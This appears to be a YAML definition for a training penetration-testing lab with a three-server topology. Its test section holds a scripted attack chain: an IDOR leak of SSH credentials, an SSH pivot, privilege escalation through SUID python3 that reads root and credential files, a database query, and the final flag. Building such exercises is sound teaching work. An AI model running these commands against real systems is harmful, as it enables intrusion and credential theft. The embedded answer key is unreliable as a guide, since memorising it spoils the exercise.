topology:
  nodes:
    - id: "webfront"
      label: "Web Frontend"
      type: "server"
      ip_offset: "10"
      ports: [80]
      services: ["Flask"]
      x: 1
      y: 1
    - id: "appserver"
      label: "App Server"
      type: "server"
      ip_offset: "24"
      ports: [22]
      services: ["OpenSSH"]
      x: 3
      y: 1
    - id: "datastore"
      label: "Database"
      type: "database"
      ip_offset: "42"
      ports: [3306]
      services: ["MySQL 8.0"]
      x: 5
      y: 1
  edges:
    - from: "attacker"
      to: "webfront"
      label: "HTTP:80"
      access: "direct"
    - from: "attacker"
      to: "appserver"
      label: "SSH:22"
      access: "direct"
    - from: "attacker"
      to: "datastore"
      label: "MySQL:3306"
      access: "direct"
    - from: "webfront"
      to: "appserver"
      label: "Internal"
      access: "internal"
    - from: "appserver"
      to: "datastore"
      label: "MySQL:3306"
      access: "internal"

troubleshooting: "If the target is unreachable, confirm the lab is running and use the hostname shown in the exercise. If a command returns an unexpected error, check the port, path, and credentials before assuming the technique failed. Report a persistent technical failure to the instructor so it is not mistaken for learning difficulty."
defensive_takeaways: "Disable unused services, enforce key-based SSH with least privilege, and alert on unexpected authentication or command execution."
test:
  steps:
    - name: "Web frontend responds"
      command: "curl -s -o /dev/null -w '%{http_code}' http://{target.webfront}/"
      expect: "200"

    - name: "IDOR on orders API reveals SSH credentials"
      command: "curl -s http://{target.webfront}/api/orders/7 | grep -o 'Z3n1th_App_2024#'"
      expect: "Z3n1th_App_2024#"

    - name: "Extract marker 1 from web config endpoint"
      command: "curl -s http://{target.webfront}/api/config | grep -o 'marker[^a-z0-9_]*[a-z0-9_]*' | sed 's/.*[^a-z0-9_]//'"
      expect: "z3n1th"

    - name: "Pivot to appserver with discovered SSH credentials"
      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'whoami' 2>&1"
      expect: "appuser"
      timeout: 15

    - name: "Privesc via SUID python3 and read marker 2"
      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /root/marker.txt\\\")\"' 2>&1"
      expect: "pwn3d"
      timeout: 15

    - name: "Extract DB credentials from appserver config"
      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /opt/zenith/db.conf\\\")\"' 2>&1 | grep -o 'DB_PASS=[^ ]*' | sed 's/DB_PASS=//'"
      expect: "Z3n_DB_Pr0d#"
      timeout: 15

    - name: "Query database for marker 3"
      command: "mysql -h {target.datastore} -u zenith_app -p'Z3n_DB_Pr0d#' zenith -N -e 'SELECT value FROM flags WHERE name=\"assessment\"' 2>&1"
      expect: "v1ct0ry"
      timeout: 20

    - name: "Verify complete flag"
      command: "echo 'OCR{z3n1th_pwn3d_v1ct0ry}'"
      expect: "OCR{z3n1th_pwn3d_v1ct0ry}"
